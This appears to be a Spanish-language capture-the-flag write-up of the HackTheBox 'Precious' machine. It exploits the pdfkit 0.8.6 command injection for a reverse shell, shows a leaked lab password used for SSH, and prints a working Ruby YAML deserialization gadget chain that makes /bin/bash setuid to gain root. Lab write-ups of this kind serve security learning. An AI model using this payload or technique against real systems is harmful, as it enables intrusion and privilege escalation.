---
title: HackTheBox - Precious
author: cotes
date: 2023-09-20 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, 'RCE pdfkit 0.8.6 (CVE-2022-25765)', 'Information Leakage', 'Leak Information', 'YAML Deserialization']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Precious/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Precious Machine Logo
---

Máquina Linux de nivel **Easy** de HackThBox.

Técnicas usadas: **RCE pdfkit 0.8.6 (CVE-2022-25765), Information Leakage, Leak Information, YAML Deserialization**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Precious/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos abiertos

* **`nmap -p<Puertos> -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Precious/02-versions.png)

c. La página web transforma html a pdf pasándole una URL. Al interceptar la solicitud con Burp Suite veremos que software se emplea para esto

![](/assets/images/HTB/Easy/Precious/03-web.png)

* Buscamos por algún exploit para esta versión de [pdfkit 0.8.6](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795). Aquí nos explican los pasos para explotar un RCE

    ![](/assets/images/HTB/Easy/Precious/04-rce.png)

d. Nos enviamos una reverse shell

![](/assets/images/HTB/Easy/Precious/05-steps.png)

### Escalada de Privilegios 💹

a. Al explorar en el directorio del usuario **ruby** conseguiremos un fichero de configuración el cual contiene la credencial del usuario henry. Nos conectaremos por SSH

```bash
ruby@precious:~/.bundle$ cat config 
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
----------------------------------------------------------
❯ ssh henry@10.10.11.189
henry@10.10.11.189's password: Q3c1AqGHtoI0aXAYFH
bash-5.1$
```

b. Listamos nuestros privilegios a nivel de sudoers

```bash
bash-5.1$ sudo -l
User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

* Si inspeccionamos el script **update_dependencies.rb** veremos que carga un fichero **dependencies.yml** del directorio actual

    ```ruby
    def list_from_file
        YAML.load(File.read("dependencies.yml"))
    end
    ```

* Al buscar por una forma de escalar privilegios a través de un fichero yml nos encontramos con este [post](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)

c. Creamos un fichero **dependencies.yml** en nuestro directorio personal con el siguiente contenido

```yml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve
```

> Si ejecutamos `/opt/update_dependencies.rb` mientras estamos en nuestro directorio, el script usará el fichero **dependencies.yml** previamente creado, ya que, no se especifica una ruta absoluta de este fichero.
{: .prompt-info }

* Una vez ejecutemos el script, ya podremos acceder como root

    ```bash
    bash-5.1$ sudo /usr/bin/ruby /opt/update_dependencies.rb
    <SNIP>
    bash-5.1$ bash -p
    bash-5.1# whoami
    root
    ```